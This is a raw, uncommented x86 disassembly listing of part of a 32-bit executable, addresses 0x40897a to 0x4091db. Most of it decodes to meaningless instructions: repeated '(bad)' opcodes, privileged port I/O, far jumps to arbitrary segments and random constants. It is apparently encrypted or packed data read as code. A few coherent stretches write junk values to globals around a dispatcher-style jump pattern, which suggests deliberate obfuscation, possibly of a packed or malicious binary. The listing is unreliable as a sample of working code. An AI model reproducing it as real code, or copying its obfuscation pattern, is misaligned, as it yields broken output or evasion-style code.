  40897a:	sbb    bh,bh
  40897c:	xor    eax,0x9e09c445
  408981:	(bad)  
  408982:	jg     0x4089c3
  408984:	stos   DWORD PTR es:[edi],eax
  408985:	hlt    
  408986:	imul   ebp,ecx,0x685489c1
  40898c:	out    dx,eax
  40898d:	and    ah,BYTE PTR [ecx]
  40898f:	clc    
  408990:	sub    esi,DWORD PTR [ecx]
  408992:	repz cli 
  408994:	(bad)  
  408995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408996:	adc    eax,0xd1a6a6dc
  40899b:	add    ebx,DWORD PTR [edx]
  40899d:	dec    ebx
  40899e:	daa    
  40899f:	aas    
  4089a0:	mov    al,ds:0xcd1d0bcd
  4089a5:	sub    cl,BYTE PTR [ebx-0x1ccf783]
  4089ab:	not    DWORD PTR ds:0x43466b
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	pop    edi
  4089db:	push   cs
  4089dc:	arpl   WORD PTR [edi+0x7e7edbd1],cx
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	pop    ecx
  4089e7:	cmp    ebp,DWORD PTR [esi-0x13]
  4089ea:	fwait
  4089eb:	mov    DWORD PTR [edi+eiz*1-0x73134253],edi
  4089f2:	pcmpeqd mm6,QWORD PTR [esi+ebx*4]
  4089f6:	mov    dl,0xb9
  4089f8:	cli    
  4089f9:	lds    edx,FWORD PTR [eax]
  4089fb:	(bad)  
  4089fc:	ja     0x4089e1
  4089fe:	hlt    
  4089ff:	dec    esi
  408a00:	adc    DWORD PTR [ebp-0x4a],esi
  408a03:	jg     0x408a3b
  408a05:	mov    al,0x11
  408a07:	sub    DWORD PTR [ebx],0xfc9a2a12
  408a0d:	xor    DWORD PTR [edx-0x2f295f32],ebx
  408a13:	push   cs
  408a14:	inc    ebx
  408a15:	or     al,BYTE PTR [ebp+0x47f74614]
  408a1b:	and    BYTE PTR [ebp-0x358d7471],bh
  408a21:	fs push 0x8241ec48
  408a27:	cmp    al,0xd9
  408a29:	push   edx
  408a2a:	inc    ebx
  408a2b:	inc    edi
  408a2c:	es pop ebp
  408a2e:	mov    bl,0xec
  408a30:	std    
  408a31:	and    eax,0xba56d881
  408a36:	xchg   ebp,eax
  408a37:	adc    dl,bl
  408a39:	xchg   esp,eax
  408a3a:	stos   DWORD PTR es:[edi],eax
  408a3b:	repnz in eax,0x32
  408a3e:	mov    eax,ds:0x13660be0
  408a43:	lea    ebx,[edi]
  408a45:	repz dec ebp
  408a47:	lds    edx,FWORD PTR [edi+0x55]
  408a4a:	hlt    
  408a4b:	mov    al,ds:0xb3592764
  408a50:	aad    0xf5
  408a52:	(bad)  
  408a53:	mov    ebp,0x3a157de4
  408a58:	lock retf 0xe294
  408a5c:	pop    eax
  408a5d:	mov    bh,0xcf
  408a5f:	pop    edi
  408a60:	push   edx
  408a61:	pop    eax
  408a62:	and    eax,0x48e286c5
  408a67:	scas   eax,DWORD PTR es:[edi]
  408a68:	sti    
  408a69:	iret   
  408a6a:	jo     0x408a1e
  408a6c:	nop
  408a6d:	push   esp
  408a6e:	sub    eax,0xba38f337
  408a73:	push   eax
  408a74:	aam    0x4d
  408a76:	sbb    al,0x8e
  408a78:	pusha  
  408a79:	xlat   BYTE PTR ds:[ebx]
  408a7a:	scas   al,BYTE PTR es:[edi]
  408a7b:	mov    edi,0x4945f333
  408a80:	push   0x38
  408a82:	inc    ebx
  408a83:	sub    BYTE PTR [ebx+0x5603de63],bl
  408a89:	mov    dl,bl
  408a8b:	into   
  408a8c:	ret    0x617c
  408a8f:	cmp    esp,DWORD PTR [edx+esi*2+0x1]
  408a93:	xor    al,0x5a
  408a95:	dec    ebx
  408a96:	add    BYTE PTR [ebp+0x17],bh
  408a99:	nop
  408a9a:	test   al,0x66
  408a9c:	pop    esp
  408a9d:	xor    bh,ch
  408a9f:	jb     0x408a71
  408aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aa2:	sub    BYTE PTR [eax-0x17818a5b],ah
  408aa8:	outs   dx,DWORD PTR ds:[esi]
  408aa9:	sbb    BYTE PTR [ecx-0x42bcf70d],0x61
  408ab0:	lea    ebx,ds:0x399051ed
  408ab6:	push   ecx
  408ab7:	mov    ebx,0x2e694020
  408abc:	jmp    0xf2be:0x802d489d
  408ac3:	sub    ebp,edi
  408ac5:	sti    
  408ac6:	sti    
  408ac7:	ins    BYTE PTR es:[edi],dx
  408ac8:	mov    edi,0xe767164a
  408acd:	imul   eax,DWORD PTR [ebx],0x697903d8
  408ad3:	aad    0xd9
  408ad5:	jns    0x408b39
  408ad7:	aas    
  408ad8:	or     eax,0x1efd316
  408add:	mov    bl,0x23
  408adf:	fld    TBYTE PTR ss:[ebp-0x1a01b7a8]
  408ae6:	and    dh,BYTE PTR [edi+esi*2]
  408ae9:	mov    edi,0xf37f1eb5
  408aee:	mov    ds,WORD PTR [eax+0xa]
  408af1:	pop    ebp
  408af2:	pop    ebx
  408af3:	add    eax,0xe62a0eda
  408af8:	fst    QWORD PTR [edi+0x5c]
  408afb:	ins    BYTE PTR es:[edi],dx
  408afc:	imul   ebx,DWORD PTR [ebp-0x70adef8],0x967f5995
  408b06:	(bad)  
  408b07:	mov    bl,0x3b
  408b09:	or     al,0x41
  408b0b:	adc    DWORD PTR [ebp-0x29],edx
  408b0e:	pop    ss
  408b0f:	mov    edi,0x401ee2bf
  408b14:	fstp   QWORD PTR [eax-0x8]
  408b17:	rcl    DWORD PTR [ecx-0x52],0x4d
  408b1b:	aad    0xde
  408b1d:	or     al,0x59
  408b1f:	(bad)  
  408b20:	jb     0x408aa3
  408b22:	add    BYTE PTR [edi],ch
  408b24:	mov    DWORD PTR [esp+ebp*2+0x22630303],ebx
  408b2b:	push   cs
  408b2c:	fadd   QWORD PTR [ecx+ebp*2-0x23]
  408b30:	ret    0x54be
  408b33:	mov    al,0xe8
  408b35:	loope  0x408b23
  408b37:	mov    ah,BYTE PTR [edi-0x1e60a7c6]
  408b3d:	sub    dh,BYTE PTR gs:[edi-0x48]
  408b41:	inc    esp
  408b42:	rol    ah,1
  408b44:	xchg   esp,eax
  408b45:	xchg   ecx,eax
  408b46:	push   ss
  408b47:	mov    bh,0xd2
  408b49:	push   eax
  408b4a:	in     al,dx
  408b4b:	sub    al,0xa9
  408b4d:	push   0xe6921294
  408b52:	mov    edx,0xf83bb0c
  408b57:	push   ss
  408b58:	addr16 pushf 
  408b5a:	imul   ecx,DWORD PTR [ecx+0x2b281075],0x45
  408b61:	pop    ss
  408b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b63:	(bad)  
  408b64:	(bad)  
  408b65:	push   ecx
  408b66:	loop   0x408b2b
  408b68:	cmp    bh,bh
  408b6a:	push   edi
  408b6b:	inc    esi
  408b6c:	cmp    dh,BYTE PTR [ebx-0x39]
  408b6f:	jmp    0x18749b4a
  408b74:	mov    edx,0x49b843d1
  408b79:	cwde   
  408b7a:	retf   
  408b7b:	sub    BYTE PTR [ecx-0x3e3da726],al
  408b81:	sbb    bh,ah
  408b83:	add    bh,BYTE PTR [ecx-0x7a538b15]
  408b89:	jl     0x408c09
  408b8b:	jne    0x408b43
  408b8d:	int3   
  408b8e:	mov    al,0x2e
  408b90:	enter  0x8f7d,0x67
  408b94:	add    al,0xae
  408b96:	sbb    esi,DWORD PTR [ecx+0x47]
  408b99:	ja     0x408c12
  408b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b9c:	xor    eax,0x7dc23c8e
  408ba1:	dec    edi
  408ba2:	bound  ebx,QWORD PTR [esi+0x2]
  408ba5:	in     al,dx
  408ba6:	push   ecx
  408ba7:	mov    bl,0x42
  408ba9:	mov    esp,0x9ba589c3
  408bae:	fcomp  QWORD PTR [ebx-0x6b3d582a]
  408bb4:	mov    ds:0x29e0a65a,eax
  408bb9:	loope  0x408bdb
  408bbb:	push   ebp
  408bbc:	mov    ds:0x90ac7538,eax
  408bc1:	bound  ecx,QWORD PTR [edi-0x57f5f35]
  408bc7:	or     al,0x45
  408bc9:	aaa    
  408bca:	mul    BYTE PTR [ebx]
  408bcc:	cli    
  408bcd:	inc    ebp
  408bce:	push   ebp
  408bcf:	mov    eax,0x4a67b30d
  408bd4:	jl     0x408c2b
  408bd6:	sahf   
  408bd7:	dec    esp
  408bd8:	ss sar al,1
  408bdb:	mov    eax,0x29aba1aa
  408be0:	mov    ah,0xe2
  408be2:	icebp  
  408be3:	xchg   BYTE PTR [ecx-0x526d5bb8],ch
  408be9:	dec    esi
  408bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408beb:	outs   dx,DWORD PTR ds:[esi]
  408bec:	push   ds
  408bed:	stos   BYTE PTR es:[edi],al
  408bee:	mov    bh,0x36
  408bf0:	push   eax
  408bf1:	out    dx,eax
  408bf2:	out    0x81,eax
  408bf4:	ret    0x9348
  408bf7:	or     dh,cl
  408bf9:	sbb    ebp,DWORD PTR [edx+0x7]
  408bfc:	das    
  408bfd:	pop    eax
  408bfe:	into   
  408bff:	sbb    eax,0x48a7005d
  408c04:	xchg   ecx,eax
  408c05:	idiv   DWORD PTR [ebx]
  408c07:	mov    edx,0x437179d0
  408c0c:	shr    DWORD PTR [ebx-0x42de3127],cl
  408c12:	push   eax
  408c13:	aaa    
  408c14:	and    cl,BYTE PTR [ebx-0x8]
  408c17:	cmp    DWORD PTR [esi-0x4808271c],0x5c8079bc
  408c21:	in     al,0x1a
  408c23:	lock repnz repz push ebp
  408c27:	jnp    0x408bf8
  408c29:	mov    ah,0x92
  408c2b:	push   esi
  408c2c:	nop
  408c2d:	shr    DWORD PTR [ecx-0x56],1
  408c30:	mov    cl,0x68
  408c32:	xchg   edx,eax
  408c33:	xlat   BYTE PTR ds:[ebx]
  408c34:	xor    bl,BYTE PTR [edx+0x393140bd]
  408c3a:	sbb    eax,0x1f4cbb56
  408c3f:	enter  0xe28e,0x18
  408c43:	arpl   WORD PTR [ecx-0x36],bp
  408c46:	mov    al,ds:0xc47d4926
  408c4b:	xchg   edx,eax
  408c4c:	mov    ebp,0x844c2bad
  408c51:	jne    0x408c98
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x434743,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434707,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x434737,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x43466f,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x43477f,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x4346f7,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	xchg   ecx,eax
  408cca:	sub    eax,0xe54421b5
  408ccf:	jle    0x408d4f
  408cd1:	loope  0x408d4b
  408cd3:	jle    0x408d53
  408cd5:	mov    bl,0x5d
  408cd7:	xchg   DWORD PTR [esi],edi
  408cd9:	sub    esp,DWORD PTR [edx]
  408cdb:	xor    esi,DWORD PTR [eax-0x35]
  408cde:	popa   
  408cdf:	out    0x7e,eax
  408ce1:	dec    esp
  408ce2:	fidivr WORD PTR [edi+edx*1+0x75adb968]
  408ce9:	imul   ecx,DWORD PTR [ecx],0x29df7916
  408cef:	or     dl,BYTE PTR [edi]
  408cf1:	aad    0xe0
  408cf3:	pop    ebx
  408cf4:	ror    BYTE PTR [eax-0x223f4b9d],cl
  408cfa:	and    DWORD PTR [eax+0x3],0x16dc6e31
  408d01:	stos   DWORD PTR es:[edi],eax
  408d02:	mov    ebx,0xc7d44093
  408d07:	cld    
  408d08:	xchg   ebp,eax
  408d09:	inc    BYTE PTR [edx+0x47c5ae91]
  408d0f:	cmp    eax,0xaae7fe4d
  408d14:	jne    0x408d4e
  408d16:	(bad)  
  408d17:	out    0x9d,eax
  408d19:	lea    esi,ds:0x931c328a
  408d1f:	cmp    al,0xec
  408d21:	ret    0xa7d1
  408d24:	pop    edx
  408d25:	jl     0x408d51
  408d27:	add    BYTE PTR [eax+0x43440caa],dl
  408d2d:	pop    esi
  408d2e:	nop
  408d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d30:	ins    DWORD PTR es:[edi],dx
  408d31:	addr16 xor eax,0xb5107911
  408d37:	jmp    0x408d03
  408d39:	aas    
  408d3a:	jg     0x408d77
  408d3c:	lds    ecx,FWORD PTR [esi+0x64844835]
  408d42:	imul   edx,ecx,0xf5b0af0a
  408d48:	ret    0xdd2c
  408d4b:	loop   0x408d6c
  408d4d:	jmp    FWORD PTR [eax+0x4b]
  408d50:	lahf   
  408d51:	pop    ebx
  408d52:	mov    ebp,0xc4bc6ba1
  408d57:	out    0xaa,eax
  408d59:	shl    DWORD PTR [edi-0x1e],cl
  408d5c:	aaa    
  408d5d:	pusha  
  408d5e:	mov    esp,0x73fd4b70
  408d63:	frstor [ebx-0x5f8cd053]
  408d69:	inc    eax
  408d6a:	add    al,0x17
  408d6c:	shl    DWORD PTR [edi],0xf8
  408d6f:	leave  
  408d70:	sbb    ecx,DWORD PTR [ebp-0x5885d0e8]
  408d76:	call   0xe7de1eda
  408d7b:	xor    DWORD PTR [esi+0x26],0xffffff8c
  408d7f:	imul   eax,DWORD PTR [edx-0x5b66c72],0x4e962ea1
  408d89:	aaa    
  408d8a:	xchg   esp,eax
  408d8b:	outs   dx,BYTE PTR ds:[esi]
  408d8c:	mov    bh,0x80
  408d8e:	in     al,0xf1
  408d90:	aaa    
  408d91:	push   0xe161f1ea
  408d96:	sub    BYTE PTR [eax],bh
  408d98:	xor    al,0x9d
  408d9a:	addr16 popf 
  408d9c:	imul   ebx,DWORD PTR [eax],0xb79e77f4
  408da2:	sbb    BYTE PTR [eax-0x48f9ddf7],0x22
  408da9:	mov    ds,eax
  408dab:	into   
  408dac:	(bad)  
  408dad:	(bad)  
  408dae:	mov    eax,ds:0x7986bb8f
  408db3:	or     ecx,DWORD PTR [ecx+esi*1]
  408db6:	repz jg 0x408dc6
  408db9:	scas   al,BYTE PTR es:[edi]
  408dba:	in     al,dx
  408dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dbc:	bound  edx,QWORD PTR [eax+eax*8]
  408dbf:	call   0x501c:0xe354e34f
  408dc6:	rep ins DWORD PTR es:[edi],dx
  408dc8:	in     eax,dx
  408dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dca:	xchg   esp,eax
  408dcb:	sbb    ch,ch
  408dcd:	test   BYTE PTR [eax+0x7826dcbb],0xd0
  408dd4:	fcmovne st,st(7)
  408dd6:	push   eax
  408dd7:	mov    esp,0xd23d29fd
  408ddc:	mov    edi,0x1254ef4a
  408de1:	cmp    DWORD PTR [edi],ecx
  408de3:	cmp    eax,0xdcbe9091
  408de8:	mov    ebx,0x2e229201
  408ded:	jp     0x408e3c
  408def:	pop    edx
  408df1:	into   
  408df2:	pop    ebx
  408df3:	add    BYTE PTR [eax],0xf6
  408df6:	mov    es,WORD PTR [edx-0x65]
  408df9:	cmc    
  408dfa:	retf   0x1b28
  408dfd:	mov    eax,ds:0xbc2b8ee6
  408e02:	push   ebp
  408e03:	jmp    0x2d64:0x9d03791b
  408e0a:	scas   eax,DWORD PTR es:[edi]
  408e0b:	fwait
  408e0c:	push   ebp
  408e0d:	mov    edi,0xd065c8bb
  408e12:	dec    edi
  408e13:	into   
  408e14:	je     0x408daa
  408e16:	mov    ch,0xe8
  408e18:	push   esp
  408e19:	xchg   DWORD PTR ds:0xa21f8186,ebx
  408e1f:	(bad)  
  408e20:	outs   dx,BYTE PTR ds:[esi]
  408e21:	lds    eax,FWORD PTR [ebp-0x20]
  408e24:	mov    ebx,0x2d8473ac
  408e29:	rcl    DWORD PTR [ebp+0x4ff3caf5],0xa2
  408e30:	cmp    dh,BYTE PTR [ebp-0x7b]
  408e33:	loop   0x408e88
  408e35:	(bad)
  408e38:	add    al,0xe8
  408e3a:	bound  esi,QWORD PTR [eax-0x1a172a9a]
  408e40:	(bad)  
  408e41:	dec    esp
  408e42:	loope  0x408e48
  408e44:	aam    0x23
  408e46:	fisttp QWORD PTR [ebx+eax*1+0xa4eb970]
  408e4d:	mov    eax,0xd1783b43
  408e52:	retf   0x6ca1
  408e55:	add    DWORD PTR [edi-0x10],edx
  408e58:	cmp    eax,0x30e87cb5
  408e5d:	dec    eax
  408e5e:	dec    ecx
  408e5f:	sub    al,0x60
  408e61:	or     ah,BYTE PTR [eax]
  408e63:	mov    ecx,0x7fe35927
  408e68:	add    eax,0x6bef0d11
  408e6d:	jmp    0x9575:0xcfd9c18e
  408e74:	cmp    DWORD PTR [esi-0x3ec7333b],ebp
  408e7a:	(bad)  
  408e7b:	loopne 0x408e38
  408e7d:	mov    ebx,DWORD PTR [esi+0x146bd6cb]
  408e83:	adc    ah,dl
  408e85:	jle    0x408e08
  408e87:	dec    ebx
  408e88:	jno    0x408e54
  408e8a:	inc    esp
  408e8b:	loop   0x408f0a
  408e8d:	sti    
  408e8e:	(bad)  
  408e8f:	add    DWORD PTR [edx+0x13],ebx
  408e92:	sub    cl,ah
  408e94:	jmp    DWORD PTR [edi-0x44]
  408e97:	retf   0xe473
  408e9a:	fisttp QWORD PTR [eax+0x7a91cdb6]
  408ea0:	in     eax,0x9
  408ea2:	mov    ch,0x39
  408ea4:	es repz dec esp
  408ea7:	add    eax,0x71a2d7d7
  408eac:	repz ds mov edi,0x74c45bc1
  408eb3:	push   0xe74fa4cc
  408eb8:	outs   dx,BYTE PTR ds:[esi]
  408eb9:	scas   eax,DWORD PTR es:[edi]
  408eba:	in     eax,dx
  408ebb:	push   ebx
  408ebc:	xor    DWORD PTR [edx],esi
  408ebe:	ja     0x408e8b
  408ec0:	sub    edi,DWORD PTR [edx]
  408ec2:	and    DWORD PTR [edx-0x6ff57a7f],eax
  408ec8:	xor    al,BYTE PTR [edi]
  408eca:	xor    al,BYTE PTR [edx+0x4c]
  408ecd:	aas    
  408ece:	add    DWORD PTR [esi+0x5211ee42],esi
  408ed4:	jo     0x408f54
  408ed6:	ja     0x408ee4
  408ed8:	std    
  408ed9:	lds    edx,FWORD PTR [ebp+eax*1-0x1bdc333e]
  408ee0:	inc    ebp
  408ee1:	jbe    0x408ecc
  408ee3:	push   esp
  408ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee5:	cld    
  408ee6:	out    dx,al
  408ee7:	popa   
  408ee8:	xchg   edi,esp
  408eea:	std    
  408eeb:	xor    ah,BYTE PTR [eax+0x1c]
  408eee:	jbe    0x408f4e
  408ef0:	add    al,0x6d
  408ef2:	xor    al,BYTE PTR [eax]
  408ef4:	pop    esp
  408ef5:	pushf  
  408ef6:	sbb    DWORD PTR ds:[ebx],eax
  408ef9:	mov    dh,0xe9
  408efb:	inc    edx
  408efc:	or     al,0xf9
  408efe:	shl    DWORD PTR [ecx],cl
  408f00:	dec    ebp
  408f01:	repz dec ecx
  408f03:	icebp  
  408f04:	mov    ds:0xa833637e,al
  408f09:	adc    bl,BYTE PTR [ebx]
  408f0b:	js     0x408f08
  408f0d:	mov    ds:0x3233d975,eax
  408f12:	pop    eax
  408f13:	or     dh,BYTE PTR [ebp-0x51]
  408f16:	mov    edi,0x7d90f7d8
  408f1b:	pop    esi
  408f1c:	jnp    0x408eb4
  408f1e:	mov    bl,0xfd
  408f20:	stc    
  408f21:	pop    edx
  408f22:	cmp    al,0x44
  408f24:	lock lods eax,DWORD PTR ds:[esi]
  408f26:	add    BYTE PTR [edx],dh
  408f28:	aam    0xb2
  408f2a:	lods   eax,DWORD PTR ds:[esi]
  408f2b:	jle    0x408eb6
  408f2d:	push   ss
  408f2e:	cmp    ch,BYTE PTR [ebp+0x29e42b55]
  408f34:	pushf  
  408f35:	jne    0x408f4a
  408f37:	xlat   BYTE PTR ds:[bx]
  408f39:	int    0xcb
  408f3b:	fcom   QWORD PTR ds:0x83e24653
  408f41:	or     BYTE PTR gs:[eax],al
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x434743,0x434703
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434783
  408f5a:	or     DWORD PTR ds:0x434743,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x43465f,0x4346cf
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x434747,0x4346c7
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x43466b
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x434737,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x43467f,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1-0x2a034b9e]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x409036
  408fec:	xor    edx,esp
  408fee:	sbb    bl,ch
  408ff0:	call   0x52ed7e4d
  408ff5:	repnz push edi
  408ff7:	push   esi
  408ff8:	test   eax,0xa6922a7e
  408ffd:	imul   eax,ecx,0x2a
  409000:	mov    bh,0x3c
  409002:	mov    al,ds:0xb0ab74e6
  409007:	mov    ds:0x1b89e7a8,eax
  40900c:	jno    0x409050
  40900e:	lods   eax,DWORD PTR ds:[esi]
  40900f:	lahf   
  409010:	jmp    0x30cd:0xf92f5457
  409017:	sbb    DWORD PTR [ebp+0x34],ebp
  40901a:	nop
  40901b:	mov    bl,BYTE PTR [esi]
  40901d:	cmp    DWORD PTR [eax],edi
  40901f:	adc    eax,0xec18465a
  409024:	add    BYTE PTR es:[ebp-0x5d],dh
  409028:	add    dh,BYTE PTR ds:0x8f5869a6
  40902e:	xchg   BYTE PTR [ebx-0x7],dh
  409031:	jne    0x408fe8
  409033:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409035:	xchg   edi,eax
  409036:	pop    ecx
  409037:	mov    ebp,0x997cb27b
  40903c:	xchg   ch,dl
  40903e:	pop    ebx
  40903f:	cmp    al,0x14
  409041:	dec    ebx
  409042:	in     al,0xa
  409044:	inc    ecx
  409045:	fcmove st,st(4)
  409047:	leave  
  409048:	xor    DWORD PTR ds:0xc3fac219,0xab2a9169
  409052:	int    0x43
  409054:	int3   
  409055:	jae    0x408fde
  409057:	and    BYTE PTR ds:0xc81f64aa,0xb9
  40905e:	xor    BYTE PTR [esi+0xda2f222],ah
  409064:	popf   
  409065:	adc    al,0x66
  409067:	ror    BYTE PTR [eax+0x70],cl
  40906a:	imul   ebp,DWORD PTR [ecx-0x27],0x3b63f922
  409071:	and    al,0x79
  409073:	sub    BYTE PTR [ecx+0x7c160d3e],0xe5
  40907a:	add    DWORD PTR [eax*8-0x13072c3e],ebx
  409081:	jmp    0x4090f6
  409083:	ins    DWORD PTR es:[edi],dx
  409084:	in     eax,0xf4
  409086:	ins    DWORD PTR es:[edi],dx
  409087:	je     0x409103
  409089:	jo     0x409035
  40908b:	fistp  DWORD PTR [ecx-0x71d9ef67]
  409091:	call   0xcc1e:0xb45fad33
  409098:	das    
  409099:	adc    bl,ch
  40909b:	mov    cl,0xb
  40909d:	les    edx,FWORD PTR [ebx+eax*2]
  4090a0:	les    esp,FWORD PTR [ecx]
  4090a2:	adc    al,0x2b
  4090a4:	jo     0x4090c1
  4090a6:	sbb    eax,0x2cc1575a
  4090ab:	jns    0x40907d
  4090ad:	cmp    eax,0x905fbf66
  4090b2:	pop    esp
  4090b3:	aaa    
  4090b4:	stos   BYTE PTR es:[edi],al
  4090b5:	cmc    
  4090b6:	push   ss
  4090b7:	sbb    al,0x16
  4090b9:	loop   0x409071
  4090bb:	sub    esi,DWORD PTR [ebp-0x7767c782]
  4090c1:	push   0x12b472aa
  4090c6:	sti    
  4090c7:	inc    esi
  4090c8:	(bad)  
  4090c9:	mov    ecx,0xb56374ad
  4090ce:	ins    BYTE PTR es:[edi],dx
  4090cf:	sub    BYTE PTR ds:0xc8a01287,0x7e
  4090d6:	shl    BYTE PTR [edx-0x65],cl
  4090d9:	jno    0x409134
  4090db:	pop    es
  4090dc:	pop    edi
  4090dd:	pusha  
  4090de:	xchg   DWORD PTR [ecx-0x5],ebp
  4090e1:	push   ds
  4090e2:	push   edx
  4090e3:	cmp    DWORD PTR [edi+0x65e43466],esp
  4090e9:	pop    edx
  4090ea:	inc    edx
  4090eb:	ret    0xa8ac
  4090ee:	sbb    BYTE PTR [ebp+0x5f],ah
  4090f1:	fwait
  4090f2:	jg     0x4090ac
  4090f4:	popf   
  4090f5:	jb     0x4090a0
  4090f7:	cmp    al,0xa2
  4090f9:	inc    BYTE PTR [ebp-0x50503cbd]
  4090ff:	push   ds
  409100:	push   0xffffffb8
  409102:	jbe    0x40911c
  409104:	(bad)  
  409105:	aad    0xb
  409107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409108:	(bad)  
  409109:	fstp   st(6)
  40910b:	dec    ecx
  40910c:	lock cli 
  40910e:	mov    bl,0x92
  409110:	xlat   BYTE PTR ds:[ebx]
  409111:	mov    ebp,0x6a30bec1
  409116:	cmc    
  409117:	and    DWORD PTR [edi+0x5fa2649],edx
  40911d:	fs pusha 
  40911f:	jmp    0xd7fa:0xf92ce1ef
  409126:	fadd   st,st(4)
  409128:	ja     0x409173
  40912a:	dec    ebp
  40912b:	sub    eax,DWORD PTR ds:0x2d987f93
  409131:	add    cl,BYTE PTR [eax]
  409133:	xchg   ecx,eax
  409134:	jmp    0x1d06:0x881f790c
  40913b:	and    ecx,DWORD PTR [ebx+0x41]
  40913e:	std    
  40913f:	push   ds
  409140:	fadd   QWORD PTR [eax-0x7bc15185]
  409146:	ret    
  409147:	pusha  
  409148:	jbe    0x40916e
  40914a:	or     eax,0x49e3c4dd
  40914f:	ja     0x4090d5
  409151:	rcr    BYTE PTR [eax+ebx*8-0x41],1
  409155:	and    edi,edi
  409157:	sub    BYTE PTR [ecx],cl
  409159:	add    ebx,ecx
  40915b:	out    dx,eax
  40915c:	jb     0x409101
  40915e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40915f:	fs inc ecx
  409161:	ins    BYTE PTR es:[edi],dx
  409162:	xor    BYTE PTR [ebp-0x6e],0xc5
  409166:	push   ss
  409167:	ja     0x40910a
  409169:	sbb    al,al
  40916b:	(bad)  
  40916c:	gs xchg esi,eax
  40916e:	pushf  
  40916f:	inc    edi
  409170:	xor    al,0x17
  409172:	pop    ds
  409173:	push   cs
  409174:	(bad)  
  409175:	xchg   edx,eax
  409176:	mov    bh,0x6d
  409178:	sahf   
  409179:	add    al,0x73
  40917b:	popf   
  40917c:	retf   0xfedc
  40917f:	mov    esp,0x5acb9248
  409184:	cmp    BYTE PTR [ecx],al
  409186:	xor    DWORD PTR ds:0x2f915d21,edi
  40918c:	mov    fs:0x52b4d71d,eax
  409192:	sub    dh,ah
  409194:	fimul  WORD PTR [ebx-0x4682cbdc]
  40919a:	dec    ebx
  40919b:	sar    BYTE PTR [edx-0x25],cl
  40919e:	int3   
  40919f:	loopne 0x4091de
  4091a1:	xor    eax,0x1ac3bbc6
  4091a6:	inc    edx
  4091a7:	les    esi,FWORD PTR [ebp+0x72]
  4091aa:	pop    esp
  4091ab:	stos   BYTE PTR es:[edi],al
  4091ac:	push   ecx
  4091ad:	or     ecx,ebx
  4091af:	mov    ebx,0xdb53c12e
  4091b4:	sahf   
  4091b5:	lahf   
  4091b6:	sub    bh,BYTE PTR ds:0xcee48846
  4091bc:	mov    al,ds:0x9fdee3e6
  4091c1:	add    edi,edx
  4091c3:	lds    ebp,FWORD PTR [ebx]
  4091c5:	pop    eax
  4091c6:	add    ecx,DWORD PTR [edi]
  4091c8:	(bad)  
  4091ca:	mov    ecx,0x1a3c245e
  4091cf:	xchg   edx,eax
  4091d0:	dec    esi
  4091d1:	xchg   esp,eax
  4091d2:	into   
  4091d3:	fs cmp al,0x40
  4091d6:	pop    ecx
  4091d7:	cmc    
  4091d8:	cmc    
  4091d9:	retf   
  4091da:	push   ds
  4091db:	push   es
